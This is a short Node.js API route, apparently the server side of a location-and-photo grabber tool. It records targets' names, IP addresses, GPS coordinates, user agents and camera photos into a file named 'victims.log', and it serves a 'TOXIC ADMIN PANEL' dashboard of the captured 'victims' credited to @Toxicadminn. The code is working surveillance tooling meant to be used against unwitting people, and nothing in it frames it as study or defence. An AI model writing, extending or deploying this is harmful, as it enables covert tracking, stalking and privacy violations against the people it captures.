const fs = require('fs');
const path = require('path');

export default async function handler(req, res) {
  if (req.method === 'POST') {
    const data = req.body;
    const timestamp = new Date().toISOString();
    
    const logEntry = `\n=== ${timestamp} ===\nName: ${data.name}\nIP: ${req.headers['x-forwarded-for'] || 'N/A'}\nLocation: ${data.lat}, ${data.lon}\nUser-Agent: ${data.userAgent}\n\n`;

    // Log file mein save
    fs.appendFileSync(path.join('/tmp', 'victims.log'), logEntry);

    // Photo save (base64 se)
    if (data.photo) {
      const base64Data = data.photo.replace(/^data:image\/jpeg;base64,/, "");
      fs.writeFileSync(path.join('/tmp', `photo-${Date.now()}.jpg`), base64Data, 'base64');
    }

    res.status(200).json({status: "logged"});
  } else {
    // Direct Dashboard
    const logs = fs.existsSync(path.join('/tmp', 'victims.log')) 
      ? fs.readFileSync(path.join('/tmp', 'victims.log'), 'utf8') 
      : 'No victims yet...';

    res.send(`
      <!DOCTYPE html>
      <html>
      <head><title>TOXIC DASHBOARD</title>
      <style>body{background:#000;color:#0f0;font-family:monospace;padding:20px;}</style>
      </head>
      <body>
        <h1>🔥 TOXIC ADMIN PANEL - @Toxicadminn</h1>
        <pre>${logs}</pre>
        <p><a href="/api/photos" target="_blank">Photos Folder</a></p>
      </body>
      </html>
    `);
  }
}
